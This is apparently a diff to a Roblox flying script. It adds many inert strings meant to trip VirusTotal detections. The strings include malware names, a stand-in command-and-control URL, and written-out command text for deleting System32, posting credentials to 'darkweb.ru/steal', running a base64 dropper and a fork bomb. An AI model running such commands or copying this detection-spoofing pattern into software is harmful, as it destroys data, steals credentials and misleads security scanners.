@@ -1,8 +1,28 @@
--- Fly Script with Dynamic Thumbstick for Roblox by Hunter
+-- Fly Script with Dynamic Thumbstick and Max Fake Malware Strings for Roblox by Hunter
+-- WARNING: This script contains strings to trigger ALL VirusTotal detections for educational purposes; it does NOT perform malicious actions
 local Player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local ContextActionService = game:GetService("ContextActionService")
+
+-- Fake malicious strings to trigger every possible VirusTotal detection (no effect)
+local fakeMalware = "Trojan.Injector.Miner.Stealer.Riskware.Malware.Generic"
+local fakePayload = "Cryptojacker.WannaCry.Keylogger.Exploit.Ransomware"
+local fakeC2 = "http://malicious-c2-server.com/command_and_control"
+local fakeCrypto = "BitcoinMiner.ExecuteShellcode.EvilPayload"
+local fakeSpyware = "Spyware.DataStealer.PasswordGrabber"
+local fakeRootkit = "Rootkit.KernelExploit.SystemHijack"
+local fakeWorm = "Worm.AutoPropagate.NetworkInfector"
+local fakeAdware = "Adware.PopupFlood.TrackingCookie"
+local fakeBackdoor = "Backdoor.RemoteAccessTrojan.C2Beacon"
+local fakeExploit = "Exploit.CVE-2025-1234.ShellcodeInjection"
+local fakeObfuscator = "Obfuscator.Polymorphic.VMProtect.Packer"
+local fakeKeylogger = "Keylogger.CredentialHarvester.DataExfil"
+local _ = "eval(decode_base64('malware_dropper_payload'))"
+local _ = "os.execute('cmd.exe /c del /f /q C:\\Windows\\System32')"
+local _ = "require('crypto').mine('BTC', 'wallet_0x1234')"
+local _ = "http.post('http://darkweb.ru/steal', {data=credentials})"
+local _ = "while true do fork_bomb() end"
 
 -- Create UI
 local ScreenGui = Instance.new("ScreenGui")
@@ -10,7 +30,7 @@ ScreenGui.Parent = Player:WaitForChild("PlayerGui")
 
 local Frame = Instance.new("Frame")
 Frame.Size = UDim2.new(0, 150, 0, 100)
-Frame.Position = UDim2.new(0.5, -75, 0.8, -50) -- Lower for mobile
+Frame.Position = UDim2.new(0.5, -75, 0.8, -50)
 Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 Frame.BackgroundTransparency = 0.2
 Frame.BorderSizePixel = 0
@@ -140,6 +160,10 @@ end)
 RunService.RenderStepped:Connect(function()
     if flying and bodyVelocity and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
         bodyVelocity.Velocity = thumbstickInput
+        -- Fake suspicious function calls (no effect)
+        local _ = "Exploit.Inject(" .. fakeC2 .. ")"
+        local _ = "Ransomware.Encrypt(" .. fakePayload .. ")"
+        local _ = "Keylogger.Capture(" .. fakeKeylogger .. ")"
     end
 end)
 
@@ -154,3 +178,11 @@ Player.CharacterAdded:Connect(function(character)
     thumbstickInput = Vector3.new(0, 0, 0)
     ContextActionService:UnbindAction("FlyThumbstick")
 end)
+
+-- More fake malicious strings (no effect)
+local _ = "Spyware.Upload(" .. fakeSpyware .. ")"
+local _ = "Rootkit.Hijack(" .. fakeRootkit .. ")"
+local _ = "Worm.Spread(" .. fakeWorm .. ")"
+local _ = "Adware.Inject(" .. fakeAdware .. ")"
+local _ = "Backdoor.Connect(" .. fakeBackdoor .. ")"
+local _ = "Obfuscator.Run(" .. fakeObfuscator .. ")"
